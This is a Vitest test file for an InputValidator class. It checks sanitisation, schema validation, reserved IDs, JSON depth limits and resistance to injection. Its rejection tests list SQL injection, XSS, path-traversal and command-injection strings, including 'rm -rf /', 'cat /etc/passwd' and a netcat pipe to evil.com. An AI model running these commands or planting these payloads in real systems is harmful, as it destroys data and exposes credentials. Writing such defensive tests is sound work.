/**
 * @fileoverview Tests for InputValidator
 */

import { describe, it, expect } from 'vitest'
import { z } from 'zod'
import { InputValidator } from '../../../security/infrastructure/validation/InputValidator.js'

describe('InputValidator', () => {
  describe('validateString', () => {
    it('should validate normal strings', () => {
      const result = InputValidator.validateString('hello world')
      expect(result).toBe('hello world')
    })

    it('should sanitize strings by default', () => {
      const input = '  hello   world  '
      const result = InputValidator.validateString(input)
      expect(result).toBe('hello world')
    })

    it('should remove control characters', () => {
      const input = 'hello\x00\x01\x02world'
      const result = InputValidator.validateString(input)
      expect(result).toBe('helloworld')
    })

    it('should respect maxLength option', () => {
      expect(() => {
        InputValidator.validateString('hello world', { maxLength: 5 })
      }).toThrow('String length exceeds maximum of 5 characters')
    })

    it('should handle allowEmpty option', () => {
      expect(() => {
        InputValidator.validateString('', { allowEmpty: false })
      }).toThrow('String cannot be empty')

      expect(InputValidator.validateString('', { allowEmpty: true })).toBe('')
    })

    it('should validate against pattern', () => {
      const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/
      
      expect(() => {
        InputValidator.validateString('invalid-email', { pattern: emailPattern })
      }).toThrow('String does not match required pattern')

      expect(InputValidator.validateString('test@example.com', { pattern: emailPattern }))
        .toBe('test@example.com')
    })

    it('should reject non-string inputs', () => {
      expect(() => {
        InputValidator.validateString(123 as any)
      }).toThrow('Input must be a string')

      expect(() => {
        InputValidator.validateString(null as any)
      }).toThrow('Input must be a string')

      expect(() => {
        InputValidator.validateString(undefined as any)
      }).toThrow('Input must be a string')
    })

    it('should detect SQL injection patterns', () => {
      const sqlInjections = [
        "'; DROP TABLE users;--",
        'UNION SELECT * FROM passwords',
        'INSERT INTO admin VALUES',
        'UPDATE users SET password',
        'DELETE FROM sessions'
      ]

      sqlInjections.forEach(injection => {
        expect(() => {
          InputValidator.validateString(injection)
        }).toThrow('Input contains potential SQL injection patterns')
      })
    })

    it('should detect XSS patterns', () => {
      const xssAttempts = [
        '<script>alert("xss")</script>',
        '<img src="x" onerror="alert(1)">',
        '<div onclick="malicious()">',
        '</script><script>',
        '"><script>alert(1)</script>'
      ]

      xssAttempts.forEach(xss => {
        expect(() => {
          InputValidator.validateString(xss)
        }).toThrow('Input contains potential XSS patterns')
      })
    })

    it('should detect command injection patterns', () => {
      const commandInjections = [
        'test; rm -rf /',
        'test && cat /etc/passwd',
        'test | nc evil.com 1234',
        'test`whoami`',
        'test$(id)',
        'test{echo,hello}',
        'test(ls -la)'
      ]

      commandInjections.forEach(injection => {
        expect(() => {
          InputValidator.validateString(injection)
        }).toThrow('Input contains potential command injection characters')
      })
    })

    it('should detect path traversal patterns', () => {
      const pathTraversals = [
        '../../../etc/passwd',
        'test/../admin',
        '..\\windows\\system32',
        'file../../../secret'
      ]

      pathTraversals.forEach(traversal => {
        expect(() => {
          InputValidator.validateString(traversal)
        }).toThrow('Input contains potential path traversal patterns')
      })
    })

    it('should reject excessively long words', () => {
      const longWord = 'a'.repeat(1001)
      expect(() => {
        InputValidator.validateString(`hello ${longWord} world`)
      }).toThrow('Input contains excessively long words')
    })

    it('should skip sanitization when requested', () => {
      const input = '  hello   world  '
      const result = InputValidator.validateString(input, { sanitize: false })
      expect(result).toBe(input)
    })
  })

  describe('validateObject', () => {
    const testSchema = z.object({
      name: z.string(),
      age: z.number(),
      email: z.string().email()
    })

    it('should validate valid objects', () => {
      const input = {
        name: 'John Doe',
        age: 30,
        email: 'john@example.com'
      }

      const result = InputValidator.validateObject(input, testSchema)
      expect(result).toEqual(input)
    })

    it('should sanitize object strings', () => {
      const input = {
        name: '  John Doe  ',
        age: 30,
        email: 'john@example.com'
      }

      const result = InputValidator.validateObject(input, testSchema)
      expect(result.name).toBe('John Doe')
    })

    it('should fail validation for invalid objects', () => {
      const input = {
        name: 'John Doe',
        age: 'thirty', // Should be number
        email: 'invalid-email'
      }

      expect(() => {
        InputValidator.validateObject(input, testSchema)
      }).toThrow('Validation failed')
    })

    it('should handle nested objects', () => {
      const nestedSchema = z.object({
        user: z.object({
          name: z.string(),
          details: z.object({
            age: z.number()
          })
        })
      })

      const input = {
        user: {
          name: '  John  ',
          details: {
            age: 30
          }
        }
      }

      const result = InputValidator.validateObject(input, nestedSchema)
      expect(result.user.name).toBe('John')
    })

    it('should handle arrays in objects', () => {
      const arraySchema = z.object({
        tags: z.array(z.string()),
        numbers: z.array(z.number())
      })

      const input = {
        tags: ['  tag1  ', '  tag2  '],
        numbers: [1, 2, 3]
      }

      const result = InputValidator.validateObject(input, arraySchema)
      expect(result.tags).toEqual(['tag1', 'tag2'])
    })

    it('should handle null and undefined inputs', () => {
      expect(() => {
        InputValidator.validateObject(null, testSchema)
      }).toThrow('Validation failed')

      expect(() => {
        InputValidator.validateObject(undefined, testSchema)
      }).toThrow('Validation failed')
    })
  })

  describe('validateArray', () => {
    const stringValidator = (item: unknown) => {
      if (typeof item !== 'string') throw new Error('Must be string')
      return item
    }

    it('should validate valid arrays', () => {
      const input = ['hello', 'world']
      const result = InputValidator.validateArray(input, stringValidator)
      expect(result).toEqual(['hello', 'world'])
    })

    it('should respect maxLength', () => {
      const longArray = Array(101).fill('item')
      expect(() => {
        InputValidator.validateArray(longArray, stringValidator, 100)
      }).toThrow('Array length exceeds maximum of 100 elements')
    })

    it('should validate each item', () => {
      const input = ['hello', 123, 'world']
      expect(() => {
        InputValidator.validateArray(input, stringValidator)
      }).toThrow('Array item at index 1: Must be string')
    })

    it('should reject non-array inputs', () => {
      expect(() => {
        InputValidator.validateArray('not an array', stringValidator)
      }).toThrow('Input must be an array')
    })

    it('should handle empty arrays', () => {
      const result = InputValidator.validateArray([], stringValidator)
      expect(result).toEqual([])
    })

    it('should handle complex item validators', () => {
      const objectValidator = (item: unknown) => {
        if (typeof item !== 'object' || item === null) throw new Error('Must be object')
        return item as Record<string, any>
      }

      const input = [{ name: 'John' }, { name: 'Jane' }]
      const result = InputValidator.validateArray(input, objectValidator)
      expect(result).toEqual(input)
    })
  })

  describe('validateParticipantId', () => {
    it('should validate correct participant IDs', () => {
      const validIds = [
        '@user123',
        '@backend_service',
        '@mobile-app',
        '@a1'
      ]

      validIds.forEach(id => {
        const result = InputValidator.validateParticipantId(id)
        expect(result).toBe(id)
      })
    })

    it('should reject invalid participant ID formats', () => {
      const invalidIds = [
        'user123', // No @
        '@user 123', // Space
        '@', // Too short
        '@' + 'a'.repeat(31), // Too long
        '@123user', // Starts with number
        '@user@123' // Contains @
      ]

      invalidIds.forEach(id => {
        expect(() => {
          InputValidator.validateParticipantId(id)
        }).toThrow()
      })
    })

    it('should reject reserved participant IDs', () => {
      const reservedIds = [
        '@system',
        '@admin',
        '@root',
        '@null',
        '@undefined'
      ]

      reservedIds.forEach(id => {
        expect(() => {
          InputValidator.validateParticipantId(id)
        }).toThrow('Participant ID is reserved')
      })
    })

    it('should handle case insensitive reserved IDs', () => {
      const caseVariations = [
        '@SYSTEM',
        '@Admin',
        '@ROOT'
      ]

      caseVariations.forEach(id => {
        expect(() => {
          InputValidator.validateParticipantId(id)
        }).toThrow('Participant ID is reserved')
      })
    })
  })

  describe('validateJSON', () => {
    it('should validate and parse valid JSON', () => {
      const jsonString = '{"name": "John", "age": 30}'
      const result = InputValidator.validateJSON(jsonString)
      expect(result).toEqual({ name: 'John', age: 30 })
    })

    it('should reject invalid JSON', () => {
      const invalidJson = '{"name": "John", "age":}'
      expect(() => {
        InputValidator.validateJSON(invalidJson)
      }).toThrow('Invalid JSON format')
    })

    it('should reject non-string inputs', () => {
      expect(() => {
        InputValidator.validateJSON({} as any)
      }).toThrow('JSON input must be a string')
    })

    it('should reject overly large JSON', () => {
      const largeJson = '{"data": "' + 'x'.repeat(100001) + '"}'
      expect(() => {
        InputValidator.validateJSON(largeJson)
      }).toThrow('JSON input too large')
    })

    it('should detect and reject deeply nested objects', () => {
      const deeplyNested = '{"a":{"b":{"c":{"d":{"e":{"f":{"g":{"h":{"i":{"j":{"k":"value"}}}}}}}}}}}'
      expect(() => {
        InputValidator.validateJSON(deeplyNested, 5)
      }).toThrow('Object depth exceeds maximum of 5')
    })

    it('should handle arrays in JSON', () => {
      const jsonWithArray = '{"items": [1, 2, 3], "nested": [{"id": 1}]}'
      const result = InputValidator.validateJSON(jsonWithArray)
      expect(result.items).toEqual([1, 2, 3])
      expect(result.nested).toEqual([{ id: 1 }])
    })

    it('should handle null and primitive values', () => {
      expect(InputValidator.validateJSON('null')).toBeNull()
      expect(InputValidator.validateJSON('true')).toBe(true)
      expect(InputValidator.validateJSON('123')).toBe(123)
      expect(InputValidator.validateJSON('"string"')).toBe('string')
    })
  })

  describe('security edge cases', () => {
    it('should handle Unicode control characters', () => {
      const unicodeControl = 'hello\u0000\u0001world'
      const result = InputValidator.validateString(unicodeControl)
      expect(result).toBe('helloworld')
    })

    it('should handle Unicode normalization attacks', () => {
      // Different Unicode representations of the same character
      const input1 = 'café' // é as single character
      const input2 = 'cafe\u0301' // e + combining accent
      
      const result1 = InputValidator.validateString(input1)
      const result2 = InputValidator.validateString(input2)
      
      expect(result1).toBe(input1)
      expect(result2).toBe(input2)
    })

    it('should handle mixed injection attempts', () => {
      const mixedAttack = "'; DROP TABLE users; <script>alert('xss')</script> && rm -rf /"
      expect(() => {
        InputValidator.validateString(mixedAttack)
      }).toThrow() // Should detect at least one type of attack
    })

    it('should handle empty and whitespace-only strings', () => {
      expect(InputValidator.validateString('   ', { allowEmpty: true })).toBe('')
      expect(InputValidator.validateString('\t\n\r', { allowEmpty: true })).toBe('')
    })

    it('should handle very long strings', () => {
      const veryLongString = 'a'.repeat(10001)
      expect(() => {
        InputValidator.validateString(veryLongString)
      }).toThrow('String length exceeds maximum of 10000 characters')
    })

    it('should handle binary data', () => {
      const binaryData = '\x00\x01\x02\x03\xFF'
      const result = InputValidator.validateString(binaryData)
      expect(result).toBe('\xFF') // Only printable character remains
    })

    it('should handle encoding attacks', () => {
      const encodedAttacks = [
        '%3Cscript%3Ealert%281%29%3C%2Fscript%3E', // URL encoded script
        '&#60;script&#62;alert(1)&#60;/script&#62;', // HTML entity encoded
        '\\u003cscript\\u003e' // Unicode escaped
      ]

      encodedAttacks.forEach(attack => {
        // These should pass basic validation but be handled by application layer
        const result = InputValidator.validateString(attack)
        expect(typeof result).toBe('string')
      })
    })
  })

  describe('performance and DoS protection', () => {
    it('should handle reasonable string lengths efficiently', () => {
      const mediumString = 'a'.repeat(1000)
      const start = Date.now()
      InputValidator.validateString(mediumString)
      const duration = Date.now() - start
      expect(duration).toBeLessThan(100) // Should be very fast
    })

    it('should prevent ReDoS attacks', () => {
      // Pattern that could cause catastrophic backtracking
      const suspiciousInput = 'a'.repeat(1000) + '!'
      const start = Date.now()
      try {
        InputValidator.validateString(suspiciousInput)
      } catch (error) {
        // Expected to fail, but should fail quickly
      }
      const duration = Date.now() - start
      expect(duration).toBeLessThan(1000) // Should not hang
    })

    it('should handle large arrays efficiently', () => {
      const largeArray = Array(1000).fill('item')
      const stringValidator = (item: unknown) => item as string
      
      const start = Date.now()
      InputValidator.validateArray(largeArray, stringValidator)
      const duration = Date.now() - start
      expect(duration).toBeLessThan(1000)
    })

    it('should limit JSON depth to prevent stack overflow', () => {
      let deepObject = '{}'
      for (let i = 0; i < 20; i++) {
        deepObject = `{"level${i}": ${deepObject}}`
      }
      
      expect(() => {
        InputValidator.validateJSON(deepObject, 10)
      }).toThrow('Object depth exceeds maximum of 10')
    })
  })
})